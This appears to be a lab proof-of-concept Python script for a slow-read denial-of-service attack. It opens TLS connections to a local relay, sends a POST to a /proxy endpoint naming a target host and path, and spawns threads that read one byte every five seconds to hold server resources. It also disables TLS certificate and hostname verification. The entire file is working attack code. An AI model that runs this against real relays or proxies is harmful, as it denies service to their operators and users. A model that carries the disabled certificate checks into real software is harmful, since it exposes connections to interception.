import socket, ssl, time, threading

TARGET_HOST = "127.0.0.1"     # relay hostname
TARGET_PORT = 4567            # relay port
BODY = b"A"
POST_LINE   = (
    f"POST /proxy?targethost=mylocal:8081&targetpath=/file HTTP/1.1\r\n"
    f"Host: 127.0.0.1\r\n"
    f"Content-Length: {len(BODY)}\r\n\r\n"
)

# --- 1-time TLS context (reuse it across threads) ---------------------------
CTX = ssl.create_default_context()
CTX.check_hostname = False          # skip CN/SAN check (lab certs)
CTX.verify_mode    = ssl.CERT_NONE  # skip CA verification

def drain():
    # raw TCP socket to the relay
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw:
        # wrap in TLS
        with CTX.wrap_socket(raw, server_hostname=TARGET_HOST) as tls:
            tls.sendall(POST_LINE.encode() + BODY)
            # Slow-reader: read 1 byte every 5 s
            while True:
                if not tls.recv(1):          # relay closed socket
                    break
                time.sleep(5)

# --- spawn army of slow readers --------------------------------------------
# if http1.0, 1 client takse up roughly 10KB RAM usage.
# -> means impossilbe to mem overflow in http1.0
for _ in range(5):
    threading.Thread(target=drain, daemon=True).start()

while True:
    time.sleep(10)     # keep the main thread alive

